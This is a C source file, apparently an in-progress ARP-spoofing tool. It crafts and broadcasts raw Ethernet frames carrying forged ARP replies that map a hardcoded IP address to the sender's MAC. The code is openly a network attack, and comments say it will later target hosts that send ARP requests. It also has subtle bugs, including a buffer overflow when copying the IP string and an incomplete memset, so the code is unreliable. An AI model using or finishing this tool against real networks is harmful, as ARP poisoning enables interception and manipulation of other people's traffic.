#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>           // close()
#include <string.h>           // strcpy, memset(), and memcpy()

#include <netdb.h>            // struct addrinfo
#include <sys/types.h>        // needed for socket(), uint8_t, uint16_t
#include <sys/socket.h>       // needed for socket()
#include <netinet/in.h>       // IPPROTO_RAW, INET_ADDRSTRLEN
#include <netinet/ip.h>       // IP_MAXPACKET (which is 65535)
#include <arpa/inet.h>        // inet_pton() and inet_ntop()
#include <sys/ioctl.h>        // macro ioctl is defined
#include <bits/ioctls.h>      // defines values for argument "request" of ioctl.
#include <net/if.h>           // struct ifreq
#include <linux/if_ether.h>   // ETH_P_ARP = 0x0806
#include <linux/if_packet.h>  // struct sockaddr_ll (see man 7 packet)
#include <net/ethernet.h>

#include <errno.h>            // errno, perror()

#define ETH_HDRLEN 14      // Ethernet header length
#define ARP_HDRLEN 28      // ARP header length
#define ARP_REPLY_OP 2    // Taken from <linux/if_arp.h>
#define ARP_TYPE 0x0806    // Code for ARP
#define ETH_HW_TYPE 0x0001
#define IP_TYPE 0x0800


struct eth_hdr{
  uint8_t dest_mac[6];
  uint8_t src_mac[6];
  int eth_type;
};

struct arp_hdr{
  uint16_t htype;
  uint16_t ptype;
  uint8_t hlen;
  uint8_t plen;
  uint16_t opcode;
  uint8_t src_mac[6];
  uint8_t src_ip[4];
  uint8_t dest_mac[6];
  uint8_t dest_ip[4];
};





struct ifreq *populateIfreq();
struct eth_hdr *setupEthHdr(uint8_t *dest, uint8_t *src);
struct arp_hdr *setupArpHdr(uint8_t *src_mac, uint8_t *src_ip, uint8_t *dest_mac, uint8_t *dest_ip);

int main() {
	int sd,bytes;
  char *my_mac = malloc(6);
  char *interface = malloc(40);
  struct ifreq *ifr;
  struct sockaddr_ll device;
  strcpy (interface, "wlp3s0");
  char *spoofed_IP = malloc(4);
  int status;

  //to be changed later
  strcpy(spoofed_IP,"192.168.1.50");




  ifr = populateIfreq(interface);

  //Find the index of the interface, needed for the send
  memset (&device, 0, sizeof (device));
  if ((device.sll_ifindex = if_nametoindex (interface)) == 0) {
    perror ("if_nametoindex() failed to obtain interface index ");
    exit (EXIT_FAILURE);
  }

  //Get our MAC address
  memcpy(my_mac,ifr->ifr_hwaddr.sa_data,6);


 





/*********Dummy send code for now, will be changed later**********/

  //Dummy destination, will be replaced later with whoever is sending the ARP request 
  uint8_t *dest_mac = malloc(6);
  memset(dest_mac,0xFF,6);

  


  struct eth_hdr *eth_hdr = setupEthHdr(dest_mac,my_mac);
  struct arp_hdr *arp_hdr = setupArpHdr(my_mac,spoofed_IP,dest_mac,"192.168.1.254");

  uint8_t *msg = malloc(sizeof(struct eth_hdr) + sizeof(struct arp_hdr));
  memcpy(msg,eth_hdr,ETH_HDRLEN);
  memcpy(msg+ETH_HDRLEN,arp_hdr,ARP_HDRLEN);





  if ((sd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0) {
      printf("%s\n",strerror(errno));
      return(1);
  }

  if ((bytes = sendto (sd, msg, ETH_HDRLEN + ARP_HDRLEN, 0, (struct sockaddr *) &device, sizeof (device))) <= 0) {
    perror ("sendto() failed");
    exit (EXIT_FAILURE);
  }
/**********End of dummy code*********/

  return(0);
}

struct arp_hdr *setupArpHdr(uint8_t *src_mac, uint8_t *src_ip, uint8_t *dest_mac, uint8_t *dest_ip)
{

  int status;

  struct arp_hdr *hdr = malloc(sizeof(struct arp_hdr));

  //All these values are fixed and never change for our programs purposes
  hdr->htype = htons(ETH_HW_TYPE);
  hdr->ptype = htons(IP_TYPE);
  hdr->hlen = 6;
  hdr->plen = 4;
  hdr->opcode = htons(ARP_REPLY_OP);

  if ((status = inet_pton (AF_INET, src_ip, hdr->src_ip)) != 1) {
    fprintf (stderr, "inet_pton() failed for source IP address.\nError message: %s", strerror (status));
    exit (EXIT_FAILURE);
  }

  if ((status = inet_pton (AF_INET, dest_ip, hdr->dest_ip)) != 1) {
    fprintf (stderr, "inet_pton() failed for source IP address.\nError message: %s", strerror (status));
    exit (EXIT_FAILURE);
  }

  memcpy(hdr->src_mac, src_mac, 6);
  memcpy(hdr->dest_mac, dest_mac, 6);

  return hdr;


}




//dest and src are assumed to be 6 bytes long, type is not passed since its always ARP_TYPE in this program
struct eth_hdr *setupEthHdr(uint8_t *dest, uint8_t *src)
{
  struct eth_hdr *hdr = malloc(sizeof(struct eth_hdr));

  memcpy(hdr->dest_mac,dest,6);
  memcpy(hdr->src_mac,src,6);
  hdr->eth_type = htons(ARP_TYPE);

  return hdr;

}

//Populates a ifreq struct which gives us our MAC address for the given interface
struct ifreq * populateIfreq(char *interface)
{
  int sd;
  struct ifreq *ifr = malloc(sizeof(struct ifreq));

  // Submit request for a socket descriptor to look up interface.
  if ((sd = socket (AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) {
    perror ("socket() failed to get socket descriptor for using ioctl() ");
    exit (EXIT_FAILURE);
  }

  // Use ioctl() to look up interface name and get its MAC address.
  memset (ifr, 0, sizeof (ifr));
  snprintf (ifr->ifr_name, sizeof (ifr->ifr_name), "%s", interface);
  if (ioctl (sd, SIOCGIFHWADDR, ifr) < 0) {
    perror ("ioctl() failed to get source MAC address ");
    exit (EXIT_FAILURE);
  }
  close (sd);
  return ifr;

}